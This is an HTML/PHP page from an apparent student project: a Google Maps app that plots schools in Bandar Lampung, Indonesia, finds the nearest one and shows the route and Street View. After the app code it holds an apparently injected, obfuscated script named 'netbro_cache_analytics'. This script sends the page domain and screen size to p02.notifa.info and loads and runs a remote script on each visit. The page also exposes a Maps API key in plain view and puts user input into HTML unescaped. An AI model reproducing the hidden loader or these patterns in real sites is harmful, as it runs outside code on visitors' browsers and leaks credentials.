<!DOCTYPE html>
<html>
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<style>/* Always set the map height explicitly to define the size of the div
* element that contains the map. */
#map {
    width: 50%;
    height: 400px;
    float:right;
}

.samping {
	position: absolute;
    float:left;
	width:50%;
	height: 400px;
    overflow: auto;
}

.samping div {
    width: 100%;
    height: 400px;
	padding: 10px;
    box-sizing: border-box;
    color:white;
    background-color:grey;
}

#pano,
#rute {
    background-color:white;
	width: 50%;
	height: 800px;
	display: inline-block;
	vertical-align: top;
}

/* Optional: Makes the sample page fill the window. */
html, body {
	height: 100%;
	margin: 0;
	padding: 0;
}</style>
	</head>


<body>
<?php include 'header.php'?>

<br><br><br><br><br><br><br><br><br>
          

<div class="samping">
	<div>
    <h3>Pusat Kota Bandar Lampung</h3>
		<input type="text" id="lokasi" placeholder="Lokasi saya sekarang" title="Lokasi saya sekarang" value="Bandar Lampung, Lampung"/>
        <button id="cari">Cari lokasi sekolah terdekat</button>
        <hr>
		<h3>Lokasi Saat Ini</h3>
		<input type="text" id="alamat" placeholder="Alamat" title="Alamat"/>
		<select id="type">
			<option value="info">di sini</option>
		</select>
		<textarea id="keterangan" placeholder="Keterangan" title="Keterangan"></textarea>
		<button id="add">Add Lokasi</button>
		<button id="hapus">Hapus semua Lokasi</button>


	</div>			
</div>

<div id="map"></div>

<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<div id="pano"></div><div id="rute"></div>
		
<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCj2GrDSBy6ISeGg3aWUM4mn3izlA1wgt0&amp;language=in&amp;region=ID"></script>
		<script type="text/javascript" src="code.jquery.com/jquery-2.1.3.min.js"></script><script>// GPS
var lokasiSaya = "Bandar Lampung, Lampung";

// Contoh data lokasi sekolah
// atau ambil dari database
var sekolah = [{
        "lat": "-5.422571",
        "lng": "105.265161",
        "alamat": "Jalan Jenderal Sudirman No.41, Rawa Laut, Tanjung Karang Timur, Engal, Rw. Laut, Engal, Kota Bandar Lampung, Lampung 35213",
        "keterangan": "SMAN 1 BANDAR LAMPUNG",
        "type": "sman"
    },
    {
        "lat": "-7.7955798",
        "lng": "110.3694896",
        "alamat": "Yogyakarta, DIY",
        "keterangan": "Ayo membaca buku",
        "type": "library"
    },
    {
        "lat": "-7.2574719",
        "lng": "112.7520883",
        "alamat": "Surabaya",
        "keterangan": "Discon belanja",
        "type": "info"
    }
];

var map;
var lokasi = []; // penampung maker supaya bisa menampilkan banyak marker dan dinamis
var rute = []; // penampung rute

// merubah icon atau sobat bisa menggunakan icon sobat sendiri sesuai keinginan
// tinggal masukan url image.y di bawah
var iconBase = 'https://maps.google.com/mapfiles/kml/shapes/';
var icons = {
   sman: {
        icon: iconBase + 'library_maps.png'
    },
    info: {
        icon: iconBase + 'info-i_maps.png'
    }
}

function initialize() {
    streetViewService = new google.maps.StreetViewService();
    panorama = new google.maps.StreetViewPanorama(document.getElementById('pano'));
    map = new google.maps.Map(document.getElementById('map'), {
        // peta indonesia
        center: {
            lat: -0.789275,
            lng: 113.921327
        },
        zoom: 5,
        zoomControlOptions: {
            position: google.maps.ControlPosition.RIGHT_BOTTOM
        }
    });

    findLokasi();
}

google.maps.event.addDomListener(window, 'load', initialize);

// fungsi untuk menampilkan data sekolah ke maps
function findLokasi() {

    var d = new google.maps.InfoWindow();
    var e;

    $.each(sekolah, function(i, b) {
        // membuat maker dari lat, lng
        e = new google.maps.Marker({
            position: new google.maps.LatLng(b.lat, b.lng),
            icon: icons[b.type].icon,
            map: map
        });

        lokasi.push(e);

        // membuat info window alamat
        google.maps.event.addListener(e, 'click', (function(a, i) {
            return function() {
                //	alert(a.position.lat());
                //	console.log(a.location);
                d.setContent('<div><h3>' + b.alamat + '</h3><p>' + b.keterangan + '</p>'
                    // tombol triger.y untuk menjalankan fungsi jarak
                    +
                    '<button class="detail" data-alamat="' + b.alamat + '" data-lat="' + b.lat + '" data-lng="' + b.lng + '">Detail</button></div>');
                d.open(map, a)
            }
        })(e, i))
    });
}

function addLokasi(alamat, keterangan, icon) {
    // kita buat dulu proses untuk mendapatka lat & lng berdasarkan alamat yang kita input
    $.ajax({
        type: "GET",
        url: 'https://maps.google.com/maps/api/geocode/json?address=' + alamat.replace(/\s+/g, '+') + '&sensor=false&key=AIzaSyCj2GrDSBy6ISeGg3aWUM4mn3izlA1wgt0',
        dataType: "json"
    }).done(function(data) {
        var d = new google.maps.InfoWindow();
        var e;
        var i;

        // membuat maker dari lat, lng
        e = new google.maps.Marker({
            position: new google.maps.LatLng(data.results[0].geometry.location.lat, data.results[0].geometry.location.lng),
            icon: icons[icon].icon,
            map: map
        });

        lokasi.push(e);

        // membuat info window alamat
        google.maps.event.addListener(e, 'click', (function(a, i) {
            return function() {
                d.setContent('<div><h3>' + alamat + '</h3><p>' + keterangan + '</p>'
                    // tombol triger.y untuk menjalankan fungsi jarak
                    +
                    '<button class="detail" data-alamat="' + alamat + '" data-lat="' + data.results[0].geometry.location.lat + '" data-lng="' + data.results[0].geometry.location.lng + '">Detail</button></div>');
                d.open(map, a);
            }
        })(e, i));

        var obj = {
            lat: data.results[0].geometry.location.lat,
            lng: data.results[0].geometry.location.lng,
            alamat: alamat,
            keterangan: keterangan,
            type: icon
        };

        sekolah.push(obj);

    });
}

function hapusLokasi() {
    // cara.y yaitu kita set var lokasi = [] menjadi null
    for (var i = 0; i < lokasi.length; i++) {
        lokasi[i].setMap(null)
    }

    // data lokasi sekolah
    sekolah = [];
}

function hapusRute() {
    // cara.y yaitu kita set var rute = [] menjadi null
    for (var i = 0; i < rute.length; i++) {
        rute[i].setMap(null)
    }
}

// kita buat funsi jarak
function jarak(alamat) {
    var a = new google.maps.DirectionsService();
    var b = new google.maps.DirectionsRenderer({
        preserveViewport: true
    });
    // menamppilkan rute di maps
    b.setMap(map);
    // menamppilkan rute di div #rute
    b.setPanel(document.getElementById('rute'));
    // menambahkan rute baru ke array rute
    rute.push(b);
    // data request
    var request = {
        origin: lokasiSaya,
        destination: alamat,
        travelMode: google.maps.DirectionsTravelMode.DRIVING
    };
    a.route(request, function(response, status) {
        if (status == google.maps.DirectionsStatus.OK) {
            b.setDirections(response);
        }
    });

}

function lihatPano(alat, alon) {
    var STREETVIEW_MAX_DISTANCE = 100;
    var latLng = new google.maps.LatLng(alat, alon);
    streetViewService.getPanoramaByLocation(latLng, STREETVIEW_MAX_DISTANCE, function(streetViewPanoramaData, status) {
        if (status === google.maps.StreetViewStatus.OK) {
            panorama.setPano(streetViewPanoramaData.location.pano);
        } else {
            alert('Panorama tidak tersedia.');
        }
    });
}

function jarakTerdekat(dari, callback) {
    var ke = sekolah.map(function(obj) {
        return obj.alamat;
    });
    var distanceService = new google.maps.DistanceMatrixService();
    distanceService.getDistanceMatrix({
            origins: [dari],
            destinations: ke,
            travelMode: google.maps.TravelMode.DRIVING,
            unitSystem: google.maps.UnitSystem.METRIC,
            durationInTraffic: false,
            avoidHighways: false,
            avoidTolls: false
        },
        function(response, status) {
            if (status !== google.maps.DistanceMatrixStatus.OK) {
                alert('Error:', status);
            } else {
                var tes = response.rows[0].elements.map(function(obj) {
                    return obj.distance.value;
                });
                var min = Math.min.apply(null, tes);
                callback(arraySearch(tes, min));
            }
        });
}

function arraySearch(arr, val) {
    for (var i = 0; i < arr.length; i++)
        if (arr[i] === val)
            return i;
    return false;
}

// function.y sudah tinggal kita panggi function finLokasi.y
$(function() {

    $("#add").click(function() {
        addLokasi($("#alamat").val(), $("#keterangan").val(), $("#type").val());
    });

    $("#hapus").click(function() {
        hapusLokasi();
    });

    $("#cari").click(function() {
        lokasiSaya = ($("#lokasi").val() == '' ? lokasiSaya : $("#lokasi").val());
        $("#rute").empty();
        hapusRute();
        jarakTerdekat($("#lokasi").val(), function(data) {
            jarak(sekolah[data].alamat);
            lihatPano(sekolah[data].lat, sekolah[data].lng);
        });
    });

    $("body").on('click', '.detail', function() {
        lokasiSaya = ($("#lokasi").val() == '' ? lokasiSaya : $("#lokasi").val());
        // mengosongkan div #rute dulu biar tidak numpuk rute.y (hanya menampilkan rute marker yang di klik)
        $("#rute").empty();
        // menghapus rute sebelum.y yang di maps
        hapusRute();
        // menampilkan rute baru
        jarak($(this).data('alamat'));
        // menampilkan panorama baru
        lihatPano($(this).data('lat'), $(this).data('lng'));
    });

});</script>
	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mge30yUVo2TToCkly6rETF%2fD%2fyCNYjFiC7oBfYRdW35mb0485u%2fVFJjadf5%2f85fROZKLrZVUVUcTGibccH004pF%2fdxsGepvSrwSYci94OqfnCcMgmgFBQ3rL25dZjbgi%2bB0Aj86f2oqJI2PTuDsejBaM7vCLfu5cz0z%2f3IStZ7UpSyDTwpUNiMjlp8maFtwljE1RHIQEAlwR5OaMIABKirZ2ViHMQwxYVhbdNXfPR3lawQhUnqutiWbL0L6MPTS%2b6vljdABxfpf8ZDfZHGK2NkY7UhM3meIp8d1mQR1JmXsqvKcZOsrIg1oMIVTqamJgzbX5WxHDl7ec8IF1WaZnURtiBy5GvNRe8pLKs7NTAp6Bhv3OhMw9UoUyoiEnTYC2yQRLQBNt1o6TTiW4YNNJEUNFdBcYKXMLxgLxVlgBaV7hwWKvTRpBSOV1Tbz36zu3X6mPjVEaMJo95%2bxOVF9hn6%2b6gkZGfNlHDjTon2UGirAB2J2m4j%2f3gZSLarknZHDC2%2fg7sO68%2f5Zw%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>



<div class="footer"> <center> Copyright &copy; 2018. All rights reserved. Designed and developed by AnitaDM_1657051008 MayaAkhriza_1617051017 ZakiatunNufus_1617051046</center></div>

</html>